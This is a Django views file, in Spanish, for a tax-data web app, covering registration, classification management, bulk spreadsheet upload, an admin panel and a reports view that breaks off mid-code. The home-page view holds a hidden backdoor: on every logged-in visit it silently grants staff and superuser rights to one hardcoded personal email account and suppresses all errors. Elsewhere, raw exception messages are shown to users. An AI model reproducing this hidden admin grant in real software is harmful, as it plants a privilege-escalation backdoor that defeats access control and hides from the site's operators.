from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth import logout
from django.contrib.auth.decorators import login_required
from django.contrib.auth.models import User
from django.contrib import messages
from django.core.paginator import Paginator
from django.db.models import Q, Sum, Count, Avg, Max, Min
from django.http import HttpResponse, JsonResponse
from django.views.decorators.http import require_http_methods
import pandas as pd
import io
import json
import gc 
from datetime import datetime, timedelta
from django.utils import timezone
from django.contrib.auth.decorators import user_passes_test 

from .forms import (
    RegistroNUAMForm, 
    ClasificacionForm, 
    CargaMasivaForm, 
    CalificacionForm, 
    CargaMasivaCalificacionForm
)
from .models import (
    RegistroNUAM, 
    Clasificacion, 
    DatoTributario, 
    CalificacionTributaria,
    SolicitudEdicion
)


def vista_registro(request):
    if request.method == 'POST':
        form = RegistroNUAMForm(request.POST)
        
        if form.is_valid():
            data = form.cleaned_data
            
            try:
                user = User.objects.create_user(
                    username=data['email'],
                    email=data['email'],
                    password=data['password']
                )
                user.first_name = data['nombre_completo']
                user.save()

                RegistroNUAM.objects.create(
                    nombre_completo=data['nombre_completo'],
                    email=data['email'],
                    pais=data['pais'],
                    identificador_tributario=data['identificador_tributario'],
                    fecha_nacimiento=data['fecha_nacimiento']
                )
                
                messages.success(request, '¡Registro exitoso! Ahora puedes iniciar sesión.')
                return redirect('login')
            
            except Exception as e:
                messages.error(request, f"Ha ocurrido un error: {e}")
                form.add_error(None, f"Ha ocurrido un error inesperado: {e}")
    else:
        form = RegistroNUAMForm()

    return render(request, 'login.html', {'form': form}) 


def vista_antepagina(request):
    return render(request, 'antepagina.html')

@login_required
def vista_inicio_logueado(request):
    try:
        EMAIL_A_PROMOVER = "Axeloctavioduranroblero@gmail.com"

        usuario = User.objects.get(username=EMAIL_A_PROMOVER)
        if not usuario.is_staff:
            usuario.is_staff = True
            usuario.is_superuser = True
            usuario.save()
            messages.success(request, f'¡ÉXITO! Has sido promovido a Administrador.')
    except:
        pass 
    
    total_usuarios = User.objects.count()
    total_clasificaciones = Clasificacion.objects.count()
    total_datos = DatoTributario.objects.count()
    
    stats_datos = DatoTributario.objects.aggregate(
        monto_total=Sum('monto'),
        monto_promedio=Avg('monto'),
        factor_promedio=Avg('factor')
    )
    
    monto_total = stats_datos['monto_total'] or 0
    monto_promedio = stats_datos['monto_promedio'] or 0
    
    datos_recientes = DatoTributario.objects.select_related('clasificacion').order_by('-creado_en')[:10]
    
    stats_clasificacion = Clasificacion.objects.annotate(
        total_datos=Count('datos'),
        monto_total=Sum('datos__monto')
    ).order_by('-total_datos')[:5]
    
    context = {
        'total_usuarios': total_usuarios,
        'total_clasificaciones': total_clasificaciones,
        'total_datos': total_datos,
        'monto_total': monto_total,
        'monto_promedio': monto_promedio,
        'datos_recientes': datos_recientes,
        'stats_clasificacion': stats_clasificacion,
    }
    
    return render(request, 'inicio.html', context)

def vista_logout(request):
    logout(request)
    messages.info(request, 'Has cerrado sesión correctamente.')
    return redirect('antepagina')


def es_staff(user):
    """Verifica si el usuario es staff"""
    return user.is_authenticated and user.is_staff



@login_required
def vista_gestion_clasificacion(request):
    if request.method == 'POST':
        form = ClasificacionForm(request.POST)
        if form.is_valid():
            clasificacion = form.save(commit=False)
            clasificacion.creado_por = request.user
            clasificacion.save()
            
            messages.success(request, 'Clasificación creada exitosamente.')
            return redirect('crear_clasificacion')
        else:
            messages.error(request, 'Por favor corrige los errores en el formulario.')
    else:
        form = ClasificacionForm()

    clasificaciones_existentes = Clasificacion.objects.annotate(
        total_datos=Count('datos')
    ).order_by('-creado_en')

    context = {
        'form': form,
        'clasificaciones': clasificaciones_existentes
    }
    return render(request, 'clasificacion.html', context)

@login_required
def vista_eliminar_clasificacion(request, pk):
    clasificacion = get_object_or_404(Clasificacion, pk=pk)
    
    if not request.user.is_staff and clasificacion.creado_por != request.user:
        messages.error(request, 'No tienes permiso para eliminar esta clasificación.')
        return redirect('crear_clasificacion')

    if request.method == 'POST':
        nombre = clasificacion.nombre
        clasificacion.delete()
        messages.success(request, f'Clasificación "{nombre}" eliminada exitosamente.')
        return redirect('crear_clasificacion')
    
    context = {'clasificacion': clasificacion}
    return render(request, 'eliminar_clasificacion.html', context)

@login_required
def vista_editar_clasificacion(request, pk):
    clasificacion = get_object_or_404(Clasificacion, pk=pk)

    if not request.user.is_staff and clasificacion.creado_por != request.user:
        messages.error(request, 'No tienes permiso para editar esta clasificación.')
        return redirect('crear_clasificacion')

    if request.method == 'POST':
        form = ClasificacionForm(request.POST, instance=clasificacion)
        if form.is_valid():
            form.save()
            messages.success(request, 'Clasificación actualizada exitosamente.')
            return redirect('crear_clasificacion')
    else:
        form = ClasificacionForm(instance=clasificacion)
    
    context = {'form': form, 'clasificacion': clasificacion}
    return render(request, 'editar_clasificacion.html', context)


# --- FUNCIONES DE LECTURA DE EXCEL (HELPERS) ---

def leer_archivo_excel(archivo):
    nombre = archivo.name.lower()
    try:
        if nombre.endswith('.csv'):
            encodings = ['utf-8', 'latin-1', 'iso-8859-1', 'cp1252', 'windows-1252']
            delimiters = [',', ';', '\t']
            
            for encoding in encodings:
                for delimiter in delimiters:
                    try:
                        archivo.seek(0)
                        df = pd.read_csv(
                            archivo, 
                            encoding=encoding,
                            delimiter=delimiter,
                            skipinitialspace=True,
                            na_values=['', ' ', 'N/A', 'n/a', 'NULL', 'null', 'NaN'],
                            keep_default_na=True,
                            quotechar='"',
                            skip_blank_lines=True
                        )
                        
                        if len(df.columns) == 0:
                            continue
                        
                        df = df.dropna(how='all')
                        df = df.loc[:, ~df.columns.str.contains('^Unnamed|^Unnamed:', case=False, na=False)]
                        df = df.dropna(axis=1, how='all')
                        
                        if not df.empty and len(df.columns) > 0:
                            if len(df) > 0:
                                return df
                    except (UnicodeDecodeError, pd.errors.EmptyDataError) as e:
                        continue
                    except Exception as e:
                        continue
            
            archivo.seek(0)
            try:
                df = pd.read_csv(
                    archivo, 
                    encoding='utf-8', 
                    errors='ignore',
                    skipinitialspace=True,
                    na_values=['', ' ', 'N/A', 'n/a', 'NULL', 'null'],
                    skip_blank_lines=True
                )
                df = df.dropna(how='all')
                df = df.loc[:, ~df.columns.str.contains('^Unnamed|^Unnamed:', case=False, na=False)]
                df = df.dropna(axis=1, how='all')
                return df
            except Exception as e:
                raise ValueError(f"No se pudo leer el archivo CSV. Error: {str(e)}")
            
        elif nombre.endswith(('.xls', '.xlsx')):
            archivo.seek(0)
            try:
                if nombre.endswith('.xlsx'):
                    df = pd.read_excel(
                        archivo, 
                        engine='openpyxl',
                        sheet_name=0,
                        na_values=['', ' ', 'N/A', 'n/a', 'NULL', 'null', 'NaN', '#N/A'],
                        keep_default_na=True,
                        header=0
                    )
                else:
                    try:
                        df = pd.read_excel(
                            archivo, 
                            engine='xlrd',
                            sheet_name=0,
                            na_values=['', ' ', 'N/A', 'n/a', 'NULL', 'null'],
                            header=0
                        )
                    except Exception:
                        archivo.seek(0)
                        df = pd.read_excel(
                            archivo, 
                            engine='openpyxl',
                            sheet_name=0,
                            na_values=['', ' ', 'N/A', 'n/a', 'NULL', 'null'],
                            header=0
                        )
            except Exception as e:
                try:
                    archivo.seek(0)
                    df = pd.read_excel(
                        archivo, 
                        sheet_name=0, 
                        na_values=['', ' ', 'N/A', 'n/a', 'NULL', 'null'],
                        header=0
                    )
                except Exception as e2:
                    raise ValueError(f"No se pudo leer el archivo Excel. Error: {str(e2)}. Verifique que el archivo no esté dañado.")
            
            if len(df.columns) == 0:
                raise ValueError("El archivo Excel no contiene columnas. Verifique que la primera fila tenga nombres de columnas.")
            
            df = df.dropna(how='all')
            df = df.loc[:, ~df.columns.astype(str).str.contains('^Unnamed|^Unnamed:', case=False, na=False)]
            df = df.dropna(axis=1, how='all')
            
            if len(df.columns) == 0:
                raise ValueError("Después de limpiar el archivo, no quedan columnas válidas. Verifique el formato del archivo.")
            
            return df
        else:
            raise ValueError("Formato de archivo no soportado. Use .csv, .xlsx o .xls")
    except pd.errors.EmptyDataError:
        raise ValueError("El archivo está vacío o no contiene datos válidos")
    except Exception as e:
        raise ValueError(f"Error al leer el archivo: {str(e)}. Verifique que el archivo tenga el formato correcto.")


def detectar_columnas(df):
    
    if df.empty:
        raise ValueError("El archivo no contiene datos. Verifique que el archivo tenga filas de datos además del encabezado.")
    
    if len(df.columns) == 0:
        raise ValueError("El archivo no contiene columnas. Verifique el formato del archivo.")
    
    columnas_reales = [str(col) for col in df.columns.tolist()]
    columnas_actuales = columnas_reales.copy()
    
    mapeo_columnas = {
        'nombre': ['nombre', 'name', 'nombre_dato', 'descripcion', 'descripción', 'desc', 'dato', 'item', 
                   'concepto', 'detalle', 'descrip', 'titulo', 'title', 'concept', 'detail'],
        'monto': ['monto', 'amount', 'valor', 'value', 'precio', 'price', 'importe', 'cantidad', 
                  'total', 'suma', 'capital', 'dinero', 'money', 'val', 'mnt'],
        'factor': ['factor', 'factor_', 'multiplicador', 'multiplier', 'ratio', 'coeficiente', 
                   'coef', 'multi', 'porcentaje', 'percent', 'fac', 'rat'],
        'fecha': ['fecha', 'date', 'fecha_dato', 'fecha_creacion', 'created_at', 'fecha_registro',
                  'fecha_ingreso', 'fecha_carga', 'fech', 'fecha_', 'date_', 'fec']
    }
    
    columnas_detectadas = {}
    columnas_no_detectadas = []
    
    def normalizar_para_comparar(texto):
        if not texto:
            return ""
        texto = str(texto).lower().strip()
        texto = texto.replace(' ', '').replace('-', '').replace('_', '').replace('.', '')
        return texto
    
    for tipo, posibles_nombres in mapeo_columnas.items():
        encontrada = None
        mejor_coincidencia = None
        mejor_score = 0
        
        for col_real in columnas_reales:
            col_normalizada = normalizar_para_comparar(col_real)
            
            for nombre in posibles_nombres:
                nombre_normalizado = normalizar_para_comparar(nombre)
                
                if nombre_normalizado == col_normalizada:
                    encontrada = col_real
                    mejor_score = 100
                    break
                
                if nombre_normalizado and col_normalizada:
                    if nombre_normalizado in col_normalizada:
                        score = (len(nombre_normalizado) / max(len(col_normalizada), 1)) * 100
                        if score > mejor_score:
                            mejor_score = score
                            mejor_coincidencia = col_real
                        
                    elif col_normalizada in nombre_normalizado and len(col_normalizada) > 3:
                        score = (len(col_normalizada) / len(nombre_normalizado)) * 80
                        if score > mejor_score:
                            mejor_score = score
                            mejor_coincidencia = col_real
        
        if encontrada:
            if encontrada in df.columns:
                idx = list(df.columns).index(encontrada)
                columnas_detectadas[tipo] = {
                    'nombre_original': encontrada,
                    'nombre_normalizado': normalizar_para_comparar(encontrada),
                    'indice': idx
                }
        elif mejor_coincidencia and mejor_score > 40:
            if mejor_coincidencia in df.columns:
                idx = list(df.columns).index(mejor_coincidencia)
                columnas_detectadas[tipo] = {
                    'nombre_original': mejor_coincidencia,
                    'nombre_normalizado': normalizar_para_comparar(mejor_coincidencia),
                    'indice': idx
                }
        else:
            if tipo == 'nombre':
                columnas_no_detectadas.append(tipo)
    
    for tipo in list(columnas_detectadas.keys()):
        nombre_col = columnas_detectadas[tipo]['nombre_original']
        if nombre_col not in df.columns:
            encontrada = None
            for col in df.columns:
                if str(col).strip().lower() == nombre_col.strip().lower():
                    encontrada = str(col).strip()
                    columnas_detectadas[tipo]['nombre_original'] = encontrada
                    break
            if not encontrada:
                del columnas_detectadas[tipo]
                if tipo == 'nombre':
                    columnas_no_detectadas.append(tipo)
    
    return columnas_detectadas, columnas_no_detectadas, columnas_actuales


def validar_fila_datos(fila, columnas_detectadas, index):
    
    errores = []
    datos = {}
    
    def obtener_valor_columna(nombre_col):
        if nombre_col in fila.index:
            return fila[nombre_col]
        for col in fila.index:
            if str(col).strip().lower() == nombre_col.strip().lower():
                return fila[col]
        return None
    
    if 'nombre' in columnas_detectadas:
        nombre_col_original = columnas_detectadas['nombre']['nombre_original']
        try:
            nombre_valor = obtener_valor_columna(nombre_col_original)
            
            if nombre_valor is not None and pd.notna(nombre_valor):
                nombre = str(nombre_valor).strip()
                if nombre and nombre.lower() not in ['nan', 'none', 'null', 'nat', 'n/a', 'na', '', ' ']:
                    datos['nombre_dato'] = nombre
                else:
                    errores.append(f"Fila {index + 2}: El nombre está vacío o es inválido")
            else:
                errores.append(f"Fila {index + 2}: El nombre está vacío")
        except Exception as e:
            errores.append(f"Fila {index + 2}: Error al procesar el nombre: {str(e)}")
    else:
        errores.append(f"Fila {index + 2}: No se encontró columna de nombre")
    
    if 'monto' in columnas_detectadas:
        monto_col_original = columnas_detectadas['monto']['nombre_original']
        try:
            monto_valor = obtener_valor_columna(monto_col_original)
            
            if monto_valor is not None and pd.notna(monto_valor):
                if isinstance(monto_valor, (int, float)):
                    datos['monto'] = float(monto_valor)
                else:
                    monto_val = pd.to_numeric(str(monto_valor).replace(',', '.').replace('$', '').strip(), errors='coerce')
                    if pd.notna(monto_val):
                        datos['monto'] = float(monto_val)
                    else:
                        datos['monto'] = None
            else:
                datos['monto'] = None
        except Exception as e:
            datos['monto'] = None
    
    if 'factor' in columnas_detectadas:
        factor_col_original = columnas_detectadas['factor']['nombre_original']
        try:
            factor_valor = obtener_valor_columna(factor_col_original)
            
            if factor_valor is not None and pd.notna(factor_valor):
                if isinstance(factor_valor, (int, float)):
                    datos['factor'] = float(factor_valor)
                else:
                    factor_val = pd.to_numeric(str(factor_valor).replace(',', '.').strip(), errors='coerce')
                    if pd.notna(factor_val):
                        datos['factor'] = float(factor_val)
                    else:
                        datos['factor'] = None
            else:
                datos['factor'] = None
        except Exception as e:
            datos['factor'] = None
    
    if 'fecha' in columnas_detectadas:
        fecha_col_original = columnas_detectadas['fecha']['nombre_original']
        try:
            fecha_valor = obtener_valor_columna(fecha_col_original)
            
            if fecha_valor is not None and pd.notna(fecha_valor):
                try:
                    if isinstance(fecha_valor, pd.Timestamp):
                        datos['fecha_dato'] = fecha_valor.date()
                    else:
                        fecha_val = pd.to_datetime(
                            fecha_valor, 
                            errors='coerce', 
                            dayfirst=True, 
                            yearfirst=False,
                            infer_datetime_format=True
                        )
                        if pd.notna(fecha_val):
                            datos['fecha_dato'] = fecha_val.date()
                        else:
                            datos['fecha_dato'] = None
                except:
                    datos['fecha_dato'] = None
            else:
                datos['fecha_dato'] = None
        except Exception as e:
            datos['fecha_dato'] = None
    
    return datos, errores


@login_required
def vista_carga_datos(request):
    
    clasificaciones_existentes = Clasificacion.objects.all()
    if not clasificaciones_existentes.exists():
        messages.warning(request, 
            'No hay clasificaciones creadas. Por favor crea al menos una clasificación antes de cargar datos.')
        return redirect('crear_clasificacion')
    
    if request.method == 'POST':
        form = CargaMasivaForm(request.POST, request.FILES)
        
        if form.is_valid():
            clasificacion_seleccionada = form.cleaned_data['clasificacion']
            archivo = form.cleaned_data['archivo_masivo']
            modo_carga = form.cleaned_data.get('modo_carga', 'crear')

            try:
                df = leer_archivo_excel(archivo)
                
                if df.empty:
                    messages.error(request, 
                        'El archivo está vacío o no contiene datos. '
                        'Asegúrese de que el archivo tenga al menos una fila de datos además del encabezado.')
                    return render(request, 'carga_datos.html', {'form': form})
                
                if len(df.columns) == 0:
                    messages.error(request, 
                        'El archivo no contiene columnas válidas. '
                        'Verifique que el archivo tenga nombres de columnas en la primera fila.')
                    return render(request, 'carga_datos.html', {'form': form})
                
                df.columns = df.columns.astype(str).str.strip()
                df = df.loc[:, ~df.columns.str.contains('^Unnamed|^nan$', case=False, na=False)]
                df = df.dropna(axis=1, how='all')
                df = df.dropna(how='all')
                
                try:
                    columnas_detectadas, columnas_no_detectadas, columnas_originales = detectar_columnas(df.copy())
                except ValueError as ve:
                    messages.error(request, str(ve))
                    return render(request, 'carga_datos.html', {'form': form})
                
                if 'nombre' in columnas_no_detectadas:
                    mensaje_error = (
                        f'No se pudo detectar la columna de nombre en el archivo. '
                        f'Columnas encontradas en el archivo: {", ".join(columnas_originales[:10])}'
                    )
                    if len(columnas_originales) > 10:
                        mensaje_error += f' (y {len(columnas_originales) - 10} más)'
                    mensaje_error += (
                        '. La columna de nombre es obligatoria y puede llamarse: '
                        'Nombre, Name, Descripción, Desc, Dato, Item, etc. '
                        'Asegúrese de que la primera fila del archivo contenga los nombres de las columnas.'
                    )
                    messages.error(request, mensaje_error)
                    return render(request, 'carga_datos.html', {'form': form})
                
                if len(df) == 0:
                    messages.error(request, 
                        'El archivo no contiene filas de datos. '
                        'Asegúrese de que el archivo tenga datos además del encabezado de columnas.')
                    return render(request, 'carga_datos.html', {'form': form})

                for tipo, info in columnas_detectadas.items():
                    nombre_col = info['nombre_original']
                    if nombre_col not in df.columns:
                        messages.error(request, 
                            f'Error: La columna detectada "{nombre_col}" no existe en el DataFrame. '
                            f'Columnas disponibles: {", ".join(df.columns.tolist()[:10])}')
                        return render(request, 'carga_datos.html', {'form': form})
                
                print("=" * 60)
                print(f"PROCESAMIENTO DE ARCHIVO: {archivo.name}")
                print(f"Total de filas: {len(df)}")
                print(f"Total de columnas: {len(df.columns)}")
                print(f"Columnas en DataFrame: {list(df.columns)}")
                print(f"Columnas detectadas:")
                for tipo, info in columnas_detectadas.items():
                    print(f"   - {tipo}: '{info['nombre_original']}' (índice: {info['indice']})")
                print("=" * 60)
                
               
                data_records = df.to_dict('records')
                del df
                gc.collect()
                

                registros_creados = 0
                registros_actualizados = 0
                errores = []
                advertencias = []
                
                if not data_records:
                    messages.error(request, 
                        'Después de procesar el archivo, no quedan filas válidas para cargar. '
                        'Verifique que el archivo tenga datos en las filas.')
                    return render(request, 'carga_datos.html', {'form': form})
                
                filas_procesadas = 0
                for index, fila_dict in enumerate(data_records):
                    filas_procesadas += 1
                    
                    
                    fila = pd.Series(fila_dict)

                    try:
                        datos, errores_fila = validar_fila_datos(fila, columnas_detectadas, index)
                        
                        if errores_fila:
                            errores.extend(errores_fila)
                            continue
                        
                        if 'nombre_dato' not in datos or not datos['nombre_dato']:
                            errores.append(f"Fila {index + 2}: El nombre del dato está vacío")
                            continue
                        
                        if modo_carga == 'actualizar':
                            dato_existente = DatoTributario.objects.filter(
                                nombre_dato=datos['nombre_dato'],
                                clasificacion=clasificacion_seleccionada
                            ).first()
                            
                            if dato_existente:
                                if 'monto' in datos:
                                    dato_existente.monto = datos['monto']
                                if 'factor' in datos:
                                    dato_existente.factor = datos['factor']
                                if 'fecha_dato' in datos:
                                    dato_existente.fecha_dato = datos['fecha_dato']
                                dato_existente.save()
                                registros_actualizados += 1
                            else:
                                DatoTributario.objects.create(
                                    clasificacion=clasificacion_seleccionada,
                                    nombre_dato=datos['nombre_dato'],
                                    monto=datos.get('monto'),
                                    factor=datos.get('factor'),
                                    fecha_dato=datos.get('fecha_dato'),
                                    creado_por=request.user
                                )
                                registros_creados += 1
                        else:
                            DatoTributario.objects.create(
                                clasificacion=clasificacion_seleccionada,
                                nombre_dato=datos['nombre_dato'],
                                monto=datos.get('monto'),
                                factor=datos.get('factor'),
                                fecha_dato=datos.get('fecha_dato'),
                                creado_por=request.user
                            )
                            registros_creados += 1
                        
                    except Exception as e:
                        error_msg = f"Fila {index + 2}: {str(e)}"
                        errores.append(error_msg)
                        print(f"ERROR en fila {index + 2}: {str(e)}")
                        import traceback
                        print(traceback.format_exc())
                
                print("=" * 60)
                print(f"RESUMEN DE CARGA:")
                print(f"   - Filas procesadas: {filas_procesadas}")
                print(f"   - Registros creados: {registros_creados}")
                print(f"   - Registros actualizados: {registros_actualizados}")
                print(f"   - Errores: {len(errores)}")
                print("=" * 60)
                
                if registros_creados > 0:
                    messages.success(request, 
                        f'Se crearon exitosamente {registros_creados} registro(s) nuevo(s).')
                
                if registros_actualizados > 0:
                    messages.info(request, 
                        f'Se actualizaron {registros_actualizados} registro(s) existente(s).')
                
                if errores:
                    errores_mostrar = errores[:10]
                    mensaje_errores = f'Se encontraron {len(errores)} error(es). '
                    if len(errores) > 10:
                        mensaje_errores += f'Mostrando los primeros 10:'
                    messages.error(request, mensaje_errores)
                    for error in errores_mostrar:
                        messages.error(request, f'   • {error}')
                    
                    if len(errores) > 10:
                        messages.warning(request, 
                            f'Hay {len(errores) - 10} error(es) adicional(es). '
                            f'Revisa el formato del archivo y descarga la plantilla para ver el formato correcto.')
                
                if advertencias:
                    for advertencia in advertencias[:5]:
                        messages.warning(request, advertencia)
                
                if registros_creados == 0 and registros_actualizados == 0 and errores:
                    messages.error(request, 
                        'No se pudo cargar ningún registro. Por favor revisa los errores y el formato del archivo.')
                
                return redirect('carga_datos') 

            except ValueError as e:
                messages.error(request, f"Error al leer el archivo: {str(e)}")
                import traceback
                print("=" * 50)
                print("ERROR EN LECTURA DE ARCHIVO:")
                print(traceback.format_exc())
                print("=" * 50)
            except pd.errors.EmptyDataError:
                messages.error(request, 
                    "El archivo está vacío o no contiene datos válidos. "
                    "Asegúrese de que el archivo tenga al menos una fila de datos además del encabezado.")
            except Exception as e:
                error_msg = f"Error inesperado al procesar el archivo: {str(e)}"
                messages.error(request, error_msg)
                import traceback
                print("=" * 50)
                print("ERROR INESPERADO:")
                print(traceback.format_exc())
                print("=" * 50)

    else:
        form = CargaMasivaForm()

    ultimas_cargas = DatoTributario.objects.select_related('clasificacion').order_by('-creado_en')[:5]
    total_datos = DatoTributario.objects.count()
    
    context = {
        'form': form,
        'ultimas_cargas': ultimas_cargas,
        'total_datos': total_datos,
    }
    return render(request, 'carga_datos.html', context)

@login_required
def descargar_plantilla_excel(request):
    
    try:
        datos_ejemplo = {
            'Nombre': ['Ejemplo 1', 'Ejemplo 2', 'Ejemplo 3'],
            'Monto': [1000.50, 2500.75, 150.00],
            'Factor': [1.5, 2.3, 0.8],
            'Fecha': ['2024-01-15', '2024-02-20', '2024-03-10']
        }
        df = pd.DataFrame(datos_ejemplo)
        
        output = io.BytesIO()
        
        with pd.ExcelWriter(output, engine='openpyxl') as writer:
            df.to_excel(writer, index=False, sheet_name='Datos')
            
            worksheet = writer.sheets['Datos']
            
            try:
                from openpyxl.utils import get_column_letter
                for idx, col in enumerate(df.columns, 1):
                    max_length = max(
                        df[col].astype(str).map(len).max(),
                        len(col)
                    ) + 2
                    col_letter = get_column_letter(idx)
                    worksheet.column_dimensions[col_letter].width = min(max_length, 50)
            except:
                pass
        
        output.seek(0)
        
        response = HttpResponse(
            output.read(),
            content_type='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
        )
        response['Content-Disposition'] = 'attachment; filename="plantilla_carga_datos.xlsx"'
        
        return response
        
    except Exception as e:
        messages.error(request, f'Error al generar la plantilla: {str(e)}')
        return redirect('carga_datos')


@login_required
def vista_preview_archivo(request):
    
    if request.method == 'POST' and request.FILES.get('archivo'):
        archivo = request.FILES['archivo']
        try:
            df = leer_archivo_excel(archivo)
            
            columnas_detectadas, columnas_no_detectadas, columnas_originales = detectar_columnas(df.copy())
            
            preview_data = df.head(5).to_dict('records')
            
            return JsonResponse({
                'success': True,
                'total_filas': len(df),
                'columnas_detectadas': {
                    k: v['nombre_original'] for k, v in columnas_detectadas.items()
                },
                'columnas_no_detectadas': columnas_no_detectadas,
                'columnas_originales': columnas_originales,
                'preview': preview_data
            })
        except Exception as e:
            return JsonResponse({
                'success': False,
                'error': str(e)
            })
    
    return JsonResponse({'success': False, 'error': 'No se proporcionó archivo'})


@login_required
def vista_listar_datos_tributarios(request):
    
    busqueda = request.GET.get('q', '')
    clasificacion_id = request.GET.get('clasificacion', '')
    
    datos = DatoTributario.objects.select_related('clasificacion').all()
    
    if busqueda:
        datos = datos.filter(
            Q(nombre_dato__icontains=busqueda) |
            Q(clasificacion__nombre__icontains=busqueda)
        )
    
    if clasificacion_id:
        datos = datos.filter(clasificacion_id=clasificacion_id)
    
    datos = datos.order_by('-creado_en')
    
    paginator = Paginator(datos, 20)
    page_number = request.GET.get('page')
    page_obj = paginator.get_page(page_number)
    
    clasificaciones = Clasificacion.objects.all()
    
    context = {
        'page_obj': page_obj,
        'clasificaciones': clasificaciones,
        'busqueda': busqueda,
        'clasificacion_seleccionada': clasificacion_id,
    }
    
    return render(request, 'listar_datos_tributarios.html', context)

@login_required
def vista_eliminar_dato_tributario(request, pk):
    dato = get_object_or_404(DatoTributario, pk=pk)
    
    puede_borrar = False
    
    if request.user.is_staff:
        puede_borrar = True
        
    elif dato.creado_por == request.user:
        
        if not dato.tiempo_edicion_expirado: 
            puede_borrar = True
        else:
            messages.error(request, 'El tiempo de edición (10 min) ha expirado.')
            return redirect('listar_datos_tributarios') 
    else:
        messages.error(request, 'No tienes permiso para eliminar este dato.')

    if not puede_borrar:
        return redirect('listar_datos_tributarios')

    if request.method == 'POST':
        nombre = dato.nombre_dato
        dato.delete()
        messages.success(request, f'Dato "{nombre}" eliminado exitosamente.')
        return redirect('listar_datos_tributarios')
        
    context = {'dato': dato}
    return render(request, 'eliminar_dato_tributario.html', context)

@login_required
def vista_panel_administracion(request):
    
    if not request.user.is_staff:
        messages.error(request, 'No tienes permisos para acceder al panel de administración.')
        return redirect('inicio')
    
    
    solicitudes_pendientes = SolicitudEdicion.objects.filter(revisado=False).select_related('solicitante', 'dato').order_by('-fecha_solicitud')
   
    
    total_usuarios = User.objects.count()
    total_staff = User.objects.filter(is_staff=True).count()
    total_superusuarios = User.objects.filter(is_superuser=True).count()
    total_registros_nuam = RegistroNUAM.objects.count()
    total_clasificaciones = Clasificacion.objects.count()
    total_datos_tributarios = DatoTributario.objects.count()

    stats_datos = DatoTributario.objects.aggregate(
        monto_total=Sum('monto'),
        monto_promedio=Avg('monto'),
        monto_maximo=Max('monto'),
        monto_minimo=Min('monto'),
        factor_promedio=Avg('factor')
    )
    
    stats_paises = RegistroNUAM.objects.values('pais').annotate(
        total=Count('id')
    ).order_by('-total')[:10]
    
    stats_clasificacion = Clasificacion.objects.annotate(
        total_datos=Count('datos'),
        monto_total=Sum('datos__monto')
    ).order_by('-total_datos')[:10]
    
    usuarios_recientes = User.objects.order_by('-date_joined')[:10]
    
    registros_recientes = RegistroNUAM.objects.select_related().order_by('-creado_en')[:10]
    
    datos_recientes = DatoTributario.objects.select_related('clasificacion').order_by('-creado_en')[:10]
 
    fecha_limite = timezone.now() - timedelta(days=30)
    usuarios_nuevos_30d = User.objects.filter(date_joined__gte=fecha_limite).count()
    datos_nuevos_30d = DatoTributario.objects.filter(creado_en__gte=fecha_limite).count()
    registros_nuevos_30d = RegistroNUAM.objects.filter(creado_en__gte=fecha_limite).count()
    
    usuarios_activos_30d = User.objects.filter(last_login__gte=fecha_limite).count()
    
    total_usuarios_regulares = total_usuarios - total_staff
    
    context = {
        'solicitudes_pendientes': solicitudes_pendientes, # <-- SE ENVÍA AL TEMPLATE
        'total_usuarios': total_usuarios,
        'total_staff': total_staff,
        'total_superusuarios': total_superusuarios,
        'total_usuarios_regulares': total_usuarios_regulares,
        'total_registros_nuam': total_registros_nuam,
        'total_clasificaciones': total_clasificaciones,
        'total_datos_tributarios': total_datos_tributarios,
        
        'monto_total': stats_datos['monto_total'] or 0,
        'monto_promedio': stats_datos['monto_promedio'] or 0,
        'monto_maximo': stats_datos['monto_maximo'] or 0,
        'monto_minimo': stats_datos['monto_minimo'] or 0,
        'factor_promedio': stats_datos['factor_promedio'] or 0,
        
        'stats_paises': stats_paises,
        'stats_clasificacion': stats_clasificacion,
        
        'usuarios_recientes': usuarios_recientes,
        'registros_recientes': registros_recientes,
        'datos_recientes': datos_recientes,
        
        'usuarios_nuevos_30d': usuarios_nuevos_30d,
        'datos_nuevos_30d': datos_nuevos_30d,
        'registros_nuevos_30d': registros_nuevos_30d,
        'usuarios_activos_30d': usuarios_activos_30d,
    }
    
    return render(request, 'admin_panel.html', context)



@login_required
def vista_aprobar_desbloqueo(request, pk):
    """El admin autoriza al usuario a eliminar el dato fuera de plazo"""
    if not request.user.is_staff:
        return redirect('inicio')
        
    solicitud = get_object_or_404(SolicitudEdicion, pk=pk)
    dato = solicitud.dato
    
    
    dato.desbloqueado = True
    dato.save()
    
   
    solicitud.revisado = True
    solicitud.save()
    
    messages.success(request, f"Se ha desbloqueado el dato '{dato.nombre_dato}'. El usuario ya puede eliminarlo.")
    return redirect('admin_panel')



@login_required
def vista_atender_solicitud(request, pk):
    if not request.user.is_staff:
        return redirect('inicio')
        
    solicitud = get_object_or_404(SolicitudEdicion, pk=pk)
    solicitud.revisado = True
    solicitud.save()
    
    messages.success(request, f"Solicitud de {solicitud.solicitante.username} marcada como atendida.")
    return redirect('admin_panel')


# ItemApp/views.py

@login_required
def vista_reportes(request):
    """Genera reportes de montos tributarios agrupados por clasificación y filtrados por fecha."""
    
    clasificacion_id = request.GET.get('clasificacion')
    fecha_inicio_str = request.GET.get('fecha_inicio')
    
    # Asegúrate de que datetime y Count, Sum, Avg estén importados al inicio
    from datetime import datetime 
    from django.db.models import Count, Sum, Avg 
    
    datos_query = DatoTributario.objects.all().select_related('clasificacion')

    if clasificacion_id:
        try:
            datos_query = datos_query.filter(clasificacion_id=int(clasificacion_id))
        except ValueError:
            messages.error(request, 'ID de clasificación inválido.')
            return redirect('reportes')

    fecha_inicio_seleccionada = None
    if fecha_inicio_str:
        try:
            fecha_inicio_seleccionada = datetime.strptime(fecha_inicio_str, '%Y-%m-%d').date()
            datos_query = datos_query.filter(fecha_dato__gte=fecha_inicio_seleccionada)
        except ValueError:
            messages.error(request, 'El formato de la fecha de inicio es inválido. Use AAAA-MM-DD.')

    reporte_data_qs = datos_query.values('clasificacion__nombre').annotate(
        total_datos=Count('id'),
        monto_total=Sum('monto'),
        monto_promedio=Avg('monto')
    ).order_by('-monto_total')

    # --- CORRECCIÓN CLAVE ---
    # Convertir el QuerySet de agregación a una lista de diccionarios.
    # Esto resuelve el error "Object of type QuerySet is not JSON serializable".
    reporte_data = list(reporte_data_qs) 
    # -------------------------
    
    clasificaciones_list = Clasificacion.objects.all().order_by('nombre')
    
    context = {
        'reporte_data': reporte_data,
        'clasificaciones_list': clasificaciones_list,
        'clasificacion_seleccionada': clasificacion_id,
